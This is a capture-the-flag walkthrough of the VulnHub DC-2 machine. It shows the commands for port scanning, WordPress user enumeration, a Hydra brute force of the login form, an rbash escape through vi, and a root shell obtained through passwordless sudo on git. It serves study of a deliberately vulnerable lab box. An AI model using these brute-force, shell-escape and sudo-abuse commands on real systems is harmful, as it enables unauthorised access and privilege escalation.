### DC-2 VulnHub Challenge Writeup

## Overview

DC-2 is a beginner-friendly VulnHub machine that focuses on WordPress exploitation, password cracking, and privilege escalation techniques. This writeup covers the complete process from reconnaissance to root access.

## Reconnaissance

### Network Discovery

First, I performed network discovery to identify the target machine:

```shellscript
netdiscover -r 192.168.1.0/24
```

The scan revealed the target at `192.168.1.15` with MAC address `08:00:27:82:b2:c2`.

### Port Scanning

Next, I conducted a comprehensive port scan:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.15 -p-
```

**Results:**

- Port 80/tcp: Apache httpd 2.4.10 (Debian)
- Port 7744/tcp: OpenSSH 6.7p1 Debian


## Web Application Analysis

### Directory Enumeration

I performed directory enumeration on the web server:

```shellscript
gobuster dir -u http://192.168.1.15/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Discovered directories:**

- `/wp-content/`
- `/wp-includes/`
- `/wp-admin/`


This confirmed the presence of a WordPress installation.

### WordPress Enumeration

I used WPScan to gather detailed information about the WordPress installation:

```shellscript
wpscan --url http://dc-2/ --enumerate u --api-token [API_TOKEN]
```

**Key findings:**

- WordPress version: 4.7.10 (vulnerable)
- Theme: Twenty Seventeen v1.2
- Users discovered: admin, jerry, tom
- 70+ vulnerabilities identified


### Flag 1 Discovery

Accessing the website revealed Flag 1 with important hints:

<img width="1232" height="640" alt="image" src="https://github.com/user-attachments/assets/1109a4a6-941a-4236-997a-10d22b9b625f" />




**Flag 1 message:**

- "Your usual wordlists probably won't work, so instead, maybe you just need to be cewl."
- "More passwords is always better, but sometimes you just can't win them all."


This hint suggested using CeWL (Custom Word List generator) to create a targeted wordlist.

## Password Cracking

### Custom Wordlist Generation

Following the hint from Flag 1, I used CeWL to generate a custom wordlist:

```shellscript
cewl -d 3 -m 5 -w corp_wordlist.txt http://dc-2/
```

This created a wordlist with 165 words extracted from the website.

### Brute Force Attack

I used Hydra to perform brute force attacks against the discovered users:

```shellscript
# Attack against tom
hydra -l tom -P corp_wordlist.txt 192.168.1.15 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -t 30

# Attack against jerry  
hydra -l jerry -P corp_wordlist.txt 192.168.1.15 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -t 30
```

**Successful credentials:**

- tom:parturient
- jerry:adipiscing


## WordPress Access and Flag 2

After logging into WordPress with the discovered credentials, I found Flag 2:

<img width="941" height="660" alt="image" src="https://github.com/user-attachments/assets/9e4e9755-b0a4-4795-af53-ae3320f03a03" />




**Flag 2 message:**

- "If you can't exploit WordPress and take a shortcut, there is another way."
- "Hope you found another entry point."


This suggested exploring SSH access as an alternative to WordPress exploitation.

## SSH Access and Restricted Shell Bypass

### Initial SSH Connection

I connected via SSH using the discovered credentials:

```shellscript
ssh tom@192.168.1.15 -p 7744
```

### Flag 3 Discovery

Once connected, I found Flag 3:

```shellscript
file_contents=$(< flag3.txt)
echo $file_contents
```

**Flag 3:** "Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes."

### Restricted Shell Analysis

The user `tom` was in a restricted bash shell (rbash) with limited commands available in `~/usr/bin/`:

- less
- ls
- scp
- vi


### Shell Escape

I used vi to escape the restricted shell:

```shellscript
vi
# In vi, type:
:!/bin/bash
```

This provided access to a full bash shell.

### PATH Manipulation

I updated the PATH variable to access system binaries:

```shellscript
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:$PATH
```

## Privilege Escalation

### User Switching

Following the hint from Flag 3, I switched to user jerry:

```shellscript
su jerry
# Password: adipiscing
```

### Flag 4 Discovery

I found Flag 4 in jerry's home directory:

```shellscript
file_contents=$(< /home/jerry/flag4.txt)
echo $file_contents
```

**Flag 4:** "Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you're on your own now. :-) Go on - git outta here!!!!"

### Sudo Privileges Check

I checked jerry's sudo privileges:

```shellscript
sudo -l
```

**Result:** User jerry can run `/usr/bin/git` as root without a password.

### Git Privilege Escalation

I exploited the git sudo permission to gain root access:

```shellscript
sudo git -p help config
```

In the pager, I executed:

```shellscript
!bash
```

This provided a root shell.

## Final Flag

With root access, I navigated to the root directory and retrieved the final flag:

```shellscript
cd /root
cat final-flag.txt
```

**Final Flag:**

```plaintext
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  / 
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/  
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___/    

Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

## Summary

The DC-2 challenge demonstrated several key penetration testing concepts:

1. **Reconnaissance**: Network discovery and service enumeration
2. **Web Application Security**: WordPress vulnerability assessment
3. **Password Attacks**: Custom wordlist generation and brute forcing
4. **Shell Restrictions**: Bypassing rbash limitations
5. **Privilege Escalation**: Exploiting sudo permissions with git


The challenge emphasized the importance of following hints and thinking creatively about different attack vectors when direct exploitation paths are blocked.
